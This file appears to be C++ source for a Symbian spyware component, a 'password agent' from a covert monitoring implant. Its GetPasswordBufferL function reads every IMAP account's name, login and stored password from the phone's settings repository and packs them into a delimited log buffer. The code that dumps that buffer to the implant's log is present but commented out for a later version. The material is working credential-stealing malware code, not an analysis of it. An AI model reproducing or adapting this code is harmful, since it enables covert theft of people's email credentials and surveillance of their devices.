/*
 * AgentPassword.cpp
 *
 *  Created on: 02/mag/2012
 *      Author: Giovanna
 */


#include "AgentPassword.h"
#include "Json.h"

#include <centralrepository.h>

CAgentPassword::CAgentPassword() :
	CAbstractAgent(EAgent_Password),iBusy(EFalse)
	{
	// No implementation required
	}

CAgentPassword::~CAgentPassword()
	{
	__FLOG(_L("Destructor"));
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CAgentPassword* CAgentPassword::NewLC(const TDesC8& params)
	{
	CAgentPassword* self = new (ELeave) CAgentPassword();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentPassword* CAgentPassword::NewL(const TDesC8& params)
	{
	CAgentPassword* self = CAgentPassword::NewLC(params);
	CleanupStack::Pop();
	return self;
	}

void CAgentPassword::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	
	__FLOG_OPEN("HT", "Agent_Password.txt");
	__FLOG(_L("-------------"));
	
	//we don't have params here
	
	}

void CAgentPassword::StartAgentCmdL()
	{
	//TODO: activate this in 8.1
	/*
	__FLOG(_L("StartAgentCmdL()"));
	if(iBusy)
		return;
	iBusy = ETrue;	
	RBuf8 buf(GetPasswordBufferL());
	buf.CleanupClosePushL();
	if (buf.Length() > 0)
		{
		TInt value;
		RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
		if(value)
			{
			// dump the buffer to the file log.
			CLogFile* logFile = CLogFile::NewLC(iFs);
			logFile->CreateLogL(LOGTYPE_PASSWORD);
			logFile->AppendLogL(buf);
			logFile->CloseLogL();
		    CleanupStack::PopAndDestroy(logFile);
			}
		}
	CleanupStack::PopAndDestroy(&buf);
	iBusy = EFalse;
	*/
	}

void CAgentPassword::StopAgentCmdL()
	{
	__FLOG(_L("StopAgentCmdL()"));
	}

void CAgentPassword::CycleAgentCmdL()
	{
	//nothing to be done, this is not an appending agent
	}


HBufC8* CAgentPassword::GetPasswordBufferL()
	{
	//create buffer	
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer); 

	TUint16 null = 0;
	TUint32 delimiter = LOG_DELIMITER;
	_LIT(KMail,"Mail");
		
	// try to get email data
	const TUid KUidMsgTypeIMAP4 = {0x1000102A}; 
	const TUint32 KNullId = 0x00000000;
	const TUint32 EAccountMask = 0x800FFFFF;
	
	CRepository* imapRepository = NULL;
	imapRepository = CRepository::NewL(KUidMsgTypeIMAP4);
	CleanupStack::PushL(imapRepository);
	//get a list of imap accounts
	RArray<TUint32> imapAccountIds;
	CleanupClosePushL(imapAccountIds);
	TInt error = imapRepository->FindL(KNullId, EAccountMask, imapAccountIds);
	TInt count = imapAccountIds.Count();  
	for(TInt i=0; i<count;i++)
		{
		TUint32 settingId = imapAccountIds[i];
		TUint32 EIMAPAccountNameId = 0x00000001; 
		TBuf<128> accountName;
		error = imapRepository->Get(settingId+EIMAPAccountNameId,accountName);
		TBuf8<64> login8;
		TBuf<64>  login;
		TUint32 EIMAPLoginNameId = 0x00000007;
		error = imapRepository->Get(settingId+EIMAPLoginNameId,login8);
		login.Copy(login8);
		TBuf8<64> password8;
		TBuf<64>  password;
		TUint32 EIMAPPasswordId = 0x00000008;
		error = imapRepository->Get(settingId+EIMAPPasswordId,password8);
		password.Copy(password8);
		//TUint32 EIMAPServerAddressId = 0x00000004;
		//TBuf<64> server;
		//error = imapRepository->Get(settingId+EIMAPServerAddressId,server);
		if(accountName.Size()>0)
			{
			buffer->InsertL(buffer->Size(),KMail().Ptr(),KMail().Size());  //application
			buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16));  // null termination 
			buffer->InsertL(buffer->Size(),login.Ptr(),login.Size()); //user
			buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16));  // null termination 
			buffer->InsertL(buffer->Size(),password.Ptr(),password.Size()); //password
			buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16));  // null termination 
			buffer->InsertL(buffer->Size(),accountName.Ptr(),accountName.Size());
			buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16));  // null termination 				
			buffer->InsertL(buffer->Size(),(TUint8 *)&delimiter,sizeof(TUint32));
			}
		}
	CleanupStack::PopAndDestroy(&imapAccountIds);
	CleanupStack::PopAndDestroy(imapRepository);
		
	HBufC8* result = buffer->Ptr(0).AllocL();
	CleanupStack::PopAndDestroy(buffer);
	return result;
	}
